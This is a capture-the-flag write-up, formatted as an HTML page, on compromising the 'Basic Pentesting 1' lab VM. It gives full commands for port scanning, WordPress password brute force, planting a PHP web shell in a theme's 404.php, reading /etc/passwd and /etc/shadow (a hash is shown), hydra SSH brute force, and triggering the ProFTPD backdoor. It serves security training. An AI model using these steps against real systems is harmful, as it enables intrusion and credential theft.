<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Penetesting Write-up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .card-author {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        .card-author img {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 15px;
        }
        h1, h2, h3 {
            color: #2c3e50;
        }
        h1 {
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        .command {
            background-color: #2c3e50;
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            font-family: monospace;
            margin: 15px 0;
            overflow-x: auto;
        }
        .sh-com {
            background-color: #ecf0f1;
            padding: 10px 15px;
            border-left: 4px solid #3498db;
            margin: 15px 0;
        }
        .sh-com span {
            font-weight: bold;
            color: #2980b9;
        }
        img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 20px auto;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 5px;
        }
        a {
            color: #3498db;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        span {
            font-weight: bold;
            color: #e74c3c;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card-author">
            <img src="img" alt="Author Image">
            <h1>Name: <span>saad 0xdy</span></h1>
            <h2>Bio: <span>I'm a senior pentester, I'm happy to share my write-up</span></h2>
        </div>
        
        <div class="doc">
            <img src="gif1" alt="Introduction GIF">
            <p>Hey guys, in this write-up I'm sharing the solution to this CTF. This is a nice CTF for beginners because it teaches how penetration testing works.</p>
            <p>I swear this CTF is designed in the best possible way, and we'll try to explain each part and how we thought about it.</p>
            
            <h1>Information Gathering:</h1>
            <p>Since this is just a CTF, we skip the <span>passive reconnaissance</span> phase, but in real life this is the most important phase as it gives you understanding of your target + provides you with valuable information about employees, programs, and sensitive hidden information.</p>
            <p>So let's move to <span>active reconnaissance</span>.</p>
            
            <h3>Active Reconnaissance</h3>
            <p>The first thing we start with is <span>port scanning</span>.</p>
            <p>I'll try to identify open ports with a tool that is fast so we don't waste much time, then we'll examine each open port in detail with nmap.</p>
            
            <p class="command">
                sudo masscan 192.168.1.108 --rate=10000 --ports 0-65535
            </p>
            
            <div class="sh-com">
                <span>masscan: </span>
                <p>One of the best tools for port scanning that lets you scan many ports in a short time.</p>
                <span>--rate: </span>
                <p>This defines the scan speed like threads.</p>
                <span>--ports: </span>
                <p>This is the argument that defines the range of ports you want to scan. I specified all existing ports.</p>
            </div>
            
            <img src="./imgs/masscan.png" alt="masscan">
            
            <h2>Now start scanning with nmap</h2>
            <p class="command">
                sudo nmap -sCV -p 22,21,80 192.168.1.108
            </p>
            
            <div class="sh-com">
                <span>nmap</span>
                <p>The best tool in network scanning.</p>
                <span>-sCV</span>
                <p>Like -sC and -sV but the last (-sV) is for getting the version specific to the port, while -sC is a flag for examining if there is information about the port using NSE.</p>
                <span>-p</span>
                <p>This flag is for specifying the ports you want nmap to scan.</p>
            </div>
            
            <img src="./imgs/1-nmap.png" alt="First scan with nmap">
            
            <h2>Using nmap scripts for getting more info</h2>
            <p>One of the best things I like is nmap scripts because they provide valuable information.</p>
            <p>First, I'll use <span>http-enum</span> which performs ENUM on HTTP services and brings you software information, version, and heading pages.</p>
            
            <p class="command">
                sudo nmap --script="http-enum" -p 80 192.168.1.108
            </p>
            
            <div class="sh-com">
                <span>--script</span>
                <p>Flag for specifying the name of the nmap script you want to run.</p>
            </div>
            
            <img src="./imgs/2-nmap.png" alt="http-enum results">
            
            <p>As we notice here, http-enum found a hidden path in the website called /secret/ which we'll save in memory to finish our scanning.</p>
            
            <p>Now I use more nmap scripts to scan the FTP port as it appears to have many areas for exploitation.</p>
            
            <p class="command">
                sudo nmap --script="ftp*" -p 21 192.168.1.108
            </p>
            
            <div class="sh-com">
                <span>"ftp*"</span>
                <p>Means use any script starting with the name FTP.</p>
            </div>
            
            <img src="./imgs/ftp-bb.png" alt="FTP scan results">
            
            <p>As we notice here, it found a dangerous vulnerability in this FTP that gives us a backdoor with ROOT privileges, meaning full access to the entire system.</p>
            <p>But this vulnerability is not available in this CTF target, because the CTF creator didn't enable it, because it literally ends the CTF completely.</p>
            <p>So we won't use it until the end of the CTF for the other parts, we'll focus on playing the CTF as it was designed so you benefit well.</p>
            
            <h3>Get more info from headers</h3>
            <p>To check that path from my first glance based on experience, it's WordPress :) but there's no harm in experiments in the world of hacking.</p>
            <p>To confirm the technology used in this path, there are two ways.</p>
            <p>I'll explain both of them.</p>
            <p>The first is using the extension <span>Wappalyzer</span> which is easy to use, just click on it to get all information.</p>
            
            <img src="./imgs/wapplay.png" alt="Wappalyzer results">
            
            <p>I don't want to boast because the page showed "powered by WordPress", but it's important to see the second technique.</p>
            <p>The second is using the <span>whatweb</span> tool, one of the best tools I use. You can simply input it in bash scripts and scan large scopes in minutes.</p>
            
            <p class="command">
                whatweb http://192.168.1.108/secret/
            </p>
            
            <img src="./imgs/watweb.png" alt="Whatweb results">
            
            <p>As you see, it's very simple, and also whatweb clearly told us and brought us more information like the backend system type.</p>
            <p>Since it's WordPress, let's start collecting information about WordPress as it's a hackers' paradise hhhh.</p>
            
            <h3>Scan CMS WordPress</h3>
            <p>When talking about WordPress, we always talk about <span>wpscan</span> as it's the best for discovery.</p>
            
            <p class="command">
                wpscan --url "http://192.168.1.108/secret/" -e u,t
            </p>
            
            <div class="sh-com">
                <span>-e</span>
                <p>Flag for using some additional useful functions in scanning like {u} to get usernames specific to this CMS, {t} to scan plugin vulnerabilities.</p>
            </div>
            
            <img src="./imgs/wpscan.png" alt="WPScan results">
            
            <p>As we see, it only brought us one valuable piece of information which is a username specific to the CMS admin, which is admin hhhh.</p>
            
            <h2>Vulnerability Scan:</h2>
            <p>As a natural reaction after getting a username, thinking about performing brute force to get passwords.</p>
            <p>So let's go to the login page, I know it by the path <span>/wp-login.php</span>, but if you don't know, try one of these tools <span>ffuf, gobuster, dirb</span>, they're good for discovering hidden pages.</p>
            <p>Based on experience, I tried the admin password, and it worked hhhhh, but I'll explain to you in another scenario if you encounter it how to guess passwords.</p>
            
            <p class="command">
                wpscan --url "http://192.168.1.108/secret/" --passwords /usr/share/wordlists/rockyou.txt --usernames admin
            </p>
            
            <div class="sh-com">
                <span>--passwords</span>
                <p>Flag for passing password wordlist.</p>
                <span>--usernames</span>
                <p>Flag for passing username.</p>
            </div>
            
            <img src="./imgs/wp-admin.png" alt="Admin panel access">
            
            <p>Fortunately, we've hacked the admin panel, but what's the next step?</p>
            <p>If the user you hacked has privileges to modify PHP files on the server, then congratulations, just upload a PHP backdoor shell, and you've hacked the server.</p>
            <p>If you don't have that, try to look for existing vulnerabilities in the version you hacked.</p>
            <p>In our case, we have the privilege so let's start.</p>
            
            <h2>Exploitation</h2>
            <p>Fortunately, I'll go to 404.php and modify its code with a PHP backdoor, giving me command injection on the server.</p>
            
            <img src="./imgs/backdoor.png" alt="Backdoor code">
            
            <p>As you see, I created that simple backdoor only to explain to you how to pass many commands in the network, secondly so you don't use ready-made scripts.</p>
            
            <p class="command">
                &lt;?php
                    echo shell_exec($_GET['cmd']);
                ?&gt;
            </p>
            
            <p>Fortunately, this is one of the simplest codes in PHP, we don't need to explain it, just copy it to Google and you'll find 100000 explanations for it, let's continue.</p>
            <p>Fortunately, if we go to the path <span>/wp-content/themes/twentyseventeen/404.php</span> we'll see a blank page, but actually it's a page that doesn't display anything that we're playing with hh.</p>
            <p>But if we do <span>/wp-content/themes/twentyseventeen/404.php?cmd=COMMAND</span> we'll see the output of that command displayed on the page, this isn't magic hh, it's the code we planted.</p>
            
            <img src="./imgs/ls-backdoor.png" alt="Backdoor command execution">
            
            <p>As you see, I used curl because I prefer it, but you can verify the same result from the browser as it's the same principle.</p>
            <p>Now let's start proper play, which is collecting as much information as possible from the server.</p>
            
            <p class="command">
                curl "http://192.168.1.108/secret/wp-content/themes/twentyseventeen/404.php?cmd=cat+/etc/passwd"
            </p>
            
            <p>Output:</p>
            <p class="command">
                root:x:0:0:root:/root:/bin/bash<br>
                marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
            </p>
            
            <p>As you see here, there are 2 users on this server: marlinspike and root. I highlighted them because the others are just services, not important.</p>
            <p>It's possible here to read the /etc/shadow file which contains password hashes for these users.</p>
            
            <p class="command">
                curl "http://192.168.1.108/secret/wp-content/themes/twentyseventeen/404.php?cmd=cat+/etc/shadow"
            </p>
            
            <p>Output:</p>
            <p class="command">
                root:!:17484:0:99999:7:::<br>
                marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
            </p>
            
            <p>This is dangerous because we can simply try to crack this hash using <span>john or hashcat</span>.</p>
            <p>And booooom, we've hacked it, but I'll leave this task for you to practice a little :)</p>
            <p>You can also read the SSH file specific to user marlinspike, and log in with his privileges via SSH, and I'll leave that for you to research.</p>
            <p>But I just performed brute force on the SSH password for user marlinspike using hydra.</p>
            
            <p class="command">
                hydra -l marlinspike -P pass.txt ssh://192.168.1.108
            </p>
            
            <img src="./imgs/hydra.png" alt="Hydra results">
            
            <p>As you see, the SSH password for user marlinspike is marlinspike.</p>
            <p>So let's log in via SSH.</p>
            
            <p class="command">
                ssh marlinspike@192.168.1.108
            </p>
            
            <h2>Privilege Escalation</h2>
            <p>Now we're in the last part which is escalating privileges to ROOT. Actually in this CTF it was very easy, but I'll explain a technique that automatically provides many information in a very clear way.</p>
            <p>First, we download <span>LinPEAS</span> which is one of the best scripts for gathering information for privilege escalation.</p>
            <p>Let's download it to the victim machine.</p>
            
            <p class="command">
                wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
            </p>
            
            <p>As you see, it's very simple.</p>
            <p>Let's run it.</p>
            
            <p class="command">
                bash linpeas.sh
            </p>
            
            <p>This will provide you with a lot of information, I just wanted to explain it to you.</p>
            <p>But I tried the command <span>sudo su</span> and actually got root.</p>
            
            <p class="command">
                marlinspike@vtcsec:~$ sudo su<br>
                [sudo] password for marlinspike:<br>
                root@vtcsec:/home/marlinspike# id<br>
                uid=0(root) gid=0(root) groups=0(root)<br>
                root@vtcsec:/home/marlinspike#
            </p>
            
            <p>And with this, we've solved this easy lab. I ask you to download it and try it, and also try the techniques mentioned here that I only explained briefly so you benefit 100%.</p>
            
            <a href="https://www.vulnhub.com/entry/basic-pentesting-1%2C216/">Download lab</a>
            
            <h2>Exploit from FTP backdoor</h2>
            <p>It's very simple :)</p>
            <p>Just connect to the port and pass the code that activates the backdoor or use a ready exploit in MSF framework.</p>
            
            <p class="command">
                nc 192.168.1.108 21 # nc connection<br>
                # response<br>
                HELP ACIDBITCHEZ # code to activate backdoor<br>
                id # normal command<br>
                uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
            </p>
            
            <img src="./imgs/backdor.png" alt="FTP backdoor exploitation">
            
            <p>You can also get a great shell through MSF using <span>use exploit/unix/ftp/proftpd_133c_backdoor</span>.</p>
            
            <h1>Goodbye hackers :)</h1>
            <p>I really hope this write-up has benefited you. Just practice well and follow it. Greetings, saad 0xdy</p>
        </div>
    </div>
</body>
</html>